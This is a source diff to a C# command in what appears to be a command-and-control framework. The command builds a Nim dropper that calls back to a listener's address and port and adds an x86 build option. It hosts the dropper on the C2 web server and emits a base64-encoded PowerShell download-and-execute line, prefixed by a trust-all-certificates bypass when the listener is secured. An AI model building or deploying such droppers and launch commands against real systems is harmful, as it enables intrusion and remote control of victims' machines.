@@ -22,11 +22,13 @@ namespace Commander.Commands.Laucher
 
         public bool webhost { get; set; }
 
+        public bool x86 { get; set; }
+
         public bool verbose { get; set; }
     }
     public class BuildDropperCommand : EnhancedCommand<BuildStagerCommandCommandOptions>
     {
-
+        public static string PowershellSSlScript  = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";
 
         public override string Category => CommandCategory.Commander;
         public override string Description => "Create a dropper file";
@@ -37,9 +39,10 @@ namespace Commander.Commands.Laucher
         public override RootCommand Command => new RootCommand(this.Description)
         {
             new Argument<string>("listenerName", "name of the listener used"),
-            new Option<string>(new[] { "--fileName", "-f" }, () => "dropper.exe" ,"Nome of the file to be crafted"),
+            new Option<string>(new[] { "--fileName", "-f" }, () => "dropper" ,"Nome of the file to be crafted"),
             new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
             new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
+            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
         };
 
@@ -60,19 +63,33 @@ namespace Commander.Commands.Laucher
 
             var dotnetparms = $"{protocol}:{listener.Ip}:{listener.PublicPort}";
 
-            string outPath = Path.Combine("/tmp", context.Options.fileName);
+            string outFile = context.Options.fileName;
+            if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
+                outFile += ".exe";
+            string outPath = Path.Combine("/tmp", outFile);
+            
             var parms = BuildHelper.ComputeNimBuildParameters("dropper", outPath, context.Options.debug, false);
 
+            if (context.Options.x86)
+                parms.Insert(3, $"--cpu:i386");
+            else
+                parms.Insert(3, $"--cpu:amd64");
 
+            //using puppy library prevent the need of ssl
+            //if (listener.Secured)
+            //{
+            //    parms.Insert(3, $"-d:ssl");
+            //}
+            var fileName = "Agent";
+            if (context.Options.x86)
+                fileName += "-x86";
+            fileName += ".b64";
 
-            
-            parms.Insert(3, $"--cpu:amd64");
-            parms.Insert(3, $"-d:ssl");
             parms.Insert(4, $"-d:ServerProtocol={protocol}");
             parms.Insert(5, $"-d:ServerPort={listener.PublicPort}");
             parms.Insert(6, $"-d:ServerAddress={listener.Ip}");
             parms.Insert(7, $"-d:DotNetParams={dotnetparms}");
-            parms.Insert(8, $"-d:FileName=Agent.b64");
+            parms.Insert(8, $"-d:FileName={fileName}");
             
 
 
@@ -95,19 +112,19 @@ namespace Commander.Commands.Laucher
             if (context.Options.webhost)
             {
                 byte[] fileContent = File.ReadAllBytes(outPath);
-                context.CommModule.WebHost(listener.Id, context.Options.fileName, fileContent);
+                context.CommModule.WebHost(listener.Id, outFile, fileContent);
 
 
 
-                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/{context.Options.fileName}";
+                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/{outFile}";
                 context.Terminal.WriteLine($"[*] dropper hosted on : {url}");
 
-                string script = $"iwr -Uri '{url}' -OutFile '{context.Options.fileName}'; .\\{context.Options.fileName}";
+                string script = $"iwr -Uri '{url}' -OutFile '{outFile}'; .\\{outFile}";
 
                 if (listener.Secured)
                 {
-                    string sslscript = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";
-                    script = sslscript + script;
+                    
+                    script = PowershellSSlScript + script;
                 }
 
                 string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
